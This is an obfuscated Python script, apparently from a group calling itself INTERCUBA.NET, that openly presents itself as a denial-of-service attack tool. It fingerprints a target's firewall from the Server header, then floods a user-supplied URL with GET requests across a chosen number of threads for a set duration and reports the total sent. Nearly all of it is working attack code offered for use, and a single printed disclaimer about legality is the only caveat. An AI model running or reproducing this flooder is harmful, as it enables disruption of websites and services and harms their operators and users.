import requests #line:1
import time #line:2
import threading #line:3
stop_event =threading .Event ()#line:6
def detect_waf (OO000O0OO0OO00000 ):#line:8
    OOOO0OO0O00OO0O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',}#line:12
    try :#line:13
        OO00OOO000000O000 =requests .get (OO000O0OO0OO00000 ,headers =OOOO0OO0O00OO0O0O ,timeout =10 )#line:14
        if 'Server'in OO00OOO000000O000 .headers and any (O0OOOOO0O0000O00O in OO00OOO000000O000 .headers ['Server']for O0OOOOO0O0000O00O in ['Cloudflare','Incapsula','ModSecurity']):#line:15
            print ('WAF Detected! :(')#line:16
        else :#line:17
            print ('No WAF Detected. :)')#line:18
    except requests .exceptions .RequestException as O0OOOO00O0O00OO0O :#line:19
        print ('Error occurred while detecting WAF:',str (O0OOOO00O0O00OO0O ))#line:20
    except requests .exceptions .Timeout :#line:21
        print ('No WAF Detected. Proceeding with the attack.')#line:22
def handler ():#line:24
    print ("Time is up!")#line:25
    print ("Stopping the attack...")#line:26
    stop_event .set ()#line:27
def send_packet (OOO00O0O000O0OOOO ,OOOOOO00OO0OOOO0O ):#line:29
    O0OOO00O0OO00OOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',}#line:32
    try :#line:33
        while not stop_event .is_set ():#line:34
            O000OO0O00000000O =requests .get (OOO00O0O000O0OOOO ,headers =O0OOO00O0OO00OOO0 )#line:35
            OOOOOO00OO0OOOO0O .increment ()#line:36
            print (f"Request {OOOOOO00OO0OOOO0O.get_count()} sent to {OOO00O0O000O0OOOO}")#line:37
    except requests .exceptions .RequestException as O0O0OO00O000O0O00 :#line:38
        print ('Error occurred while sending packet:',str (O0O0OO00O000O0O00 ))#line:39
    finally :#line:40
        stop_event .set ()#line:41
class RequestCounter :#line:46
    def __init__ (O00000OOOOOOOOOOO ):#line:47
        O00000OOOOOOOOOOO .count =0 #line:48
        O00000OOOOOOOOOOO .lock =threading .Lock ()#line:49
    def increment (OOOOOOOO000OOOO00 ):#line:51
        with OOOOOOOO000OOOO00 .lock :#line:52
            OOOOOOOO000OOOO00 .count +=1 #line:53
    def get_count (O0OO0O0O0OOOOO0OO ):#line:55
        with O0OO0O0O0OOOOO0OO .lock :#line:56
            return O0OO0O0O0OOOOO0OO .count #line:57
def attack (O00000OO0OOOOO0OO ,O000OO0O0OOO0OO0O ):#line:59
    send_packet (O00000OO0OOOOO0OO ,O000OO0O0OOO0OO0O )#line:60
def main ():#line:62
    print ("""
░░░░░░░░░░░░▄▄░░░░░░░░░░░░░░░░░░░░░░ INTERCUBA.NET
░░░░░░░░░░▄▄█▀▀▀███▀▀▀▄▄▄░░░░░░░░░░░ S.Silent 
░░░░░░▄▄▀▀▄▄▄▄▄▄▄▄▄██▄▄░░████▀▀░░░░░ S.Strike
░░░░▄▀░░░░▀█▄░░░░▀██▀░░░▀██▄▄▀▄▄░░░░ A.Arsenal
░░▄▀░░░░░░░░░▀▀▀▀▀▀░░░░░░▀▄░▀████░░░  
░▄▀░░░░░░▄█░▄▄▄▄▀▀▀▀▀▀▀▄▄▄░▀▀▀▀▀░█▄░  
▄▀░░░░░░░░█▄░░░░░░░▀▀▀▀▄▄▄▀█▄░░░░░█░
█░░░░░░░░░░░░░░░░░░░░░░░░░▀░▀█░░░░░█
█░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀█░░░░█
▀▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄█
░█▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░
░░▀▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░
░░░▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄▀░░░
░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░▄▄▀░░░░░
░░░░░░░░░▀▀▄▄▄░░░░░░░░░▄▄▄▀▀░░░░░░░░
░░░░░░░░░░░░░░▀▀▀▀▀█▀▀▀░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░█████░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░█░█░░░██░░░░░░░░░░░
░░░░░░░░░░░░░░░░█░░██░░░░█░░░░░░░░░░
░░░░░░░░░░░░░░░█░░░░██░░░░█░░░░░░░░░
░░░░░░░░░░░░░░█░░░░░░██░░░░██░░░░░░░
░░░░░░░░░░░▄██░░░░░░░░██░░░░█▄░░░░░░
░░░░░░░░░░░▄█░░░░░░░░░░██░░░░█▄░░░░░
░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░
""")#line:88
    print ("=======================================")#line:89
    print ("         D.O.S Attack Script        ")#line:90
    print ("=======================================")#line:91
    try :#line:92
        O0O000OO00O0O00OO =input ('\nEnter the target URL or IP: ')#line:93
        OO00OO0OOOOOO00OO =O0O000OO00O0O00OO if O0O000OO00O0O00OO .startswith ('http')else f'http://{O0O000OO00O0O00OO}'#line:94
        print ("\nDetecting WAF...")#line:96
        detect_waf (OO00OO0OOOOOO00OO )#line:97
        print ("=======================================\n")#line:98
        print (""" 
        *Each thread represents a separate connection making requests. (An Emulated Computer/User)
        *The more threads you have, the more concurrent requests can be sent, potentially overwhelming the target server.
        However, it's essential to use this power responsibly and legally, as launching a DOS attack on a system or website without proper authorization is illegal and unethical.""")#line:102
        print ("=======================================\n")#line:103
        O0O0O0OO0OO0000O0 =int (input ('Number of Threads: '))#line:104
        OOO0OOOO00OOOOOOO =int (input ('Duration of Attack (seconds): '))#line:105
        print ("\nStarting the attack...")#line:107
        OOOOO00O00OO00OO0 =RequestCounter ()#line:108
        O00O00O0OO000O000 =[]#line:109
        for _O0O0O0OO00OOOO00O in range (O0O0O0OO0OO0000O0 ):#line:110
            OOO00000O0OOO0O0O =threading .Thread (target =attack ,args =(OO00OO0OOOOOO00OO ,OOOOO00O00OO00OO0 ))#line:111
            O00O00O0OO000O000 .append (OOO00000O0OOO0O0O )#line:112
            OOO00000O0OOO0O0O .start ()#line:113
        print ("""
                        ▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
                        ▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
                        ▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
                        ▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
                        ░░░░▄▄███▄▄░░░░░█████░
        """)#line:120
        print ("=======================================\n")#line:121
        print ("\n D.D.O.S Attack in progress...")#line:122
        print ("=======================================\n")#line:123
        OO000O000OO00O00O =threading .Timer (OOO0OOOO00OOOOOOO ,handler )#line:125
        OO000O000OO00O00O .start ()#line:126
        while not stop_event .is_set ()and any (OO0OOOOOO0OOOOO00 .is_alive ()for OO0OOOOOO0OOOOO00 in O00O00O0OO000O000 ):#line:128
            time .sleep (1 )#line:129
        stop_event .set ()#line:131
        for OOO00000O0OOO0O0O in O00O00O0OO000O000 :#line:132
            OOO00000O0OOO0O0O .join ()#line:133
        OO000O000OO00O00O .cancel ()#line:135
        O0O0O0OOO00O0000O =OOOOO00O00OO00OO0 .get_count ()#line:137
        print ("\nTotal Requests Sent:",O0O0O0OOO00O0000O )#line:138
        print ("\nAttack finished!")#line:139
        print ("\nMain thread exiting...")#line:140
    except ValueError :#line:142
        print ('Invalid input! Please enter a valid number.')#line:143
    except KeyboardInterrupt :#line:144
        print ('Keyboard interrupt received. Stopping the attack...')#line:145
        stop_event .set ()#line:146
        for OOO00000O0OOO0O0O in O00O00O0OO000O000 :#line:147
            OOO00000O0OOO0O0O .join ()#line:148
        print ('DOS Attack stopped!')#line:149
    except Exception as OO0O00O000O0OOOOO :#line:150
        print ('An error occurred:',str (OO0O00O000O0OOOOO ))#line:151
if __name__ =='__main__':#line:153
    main ()#line:154
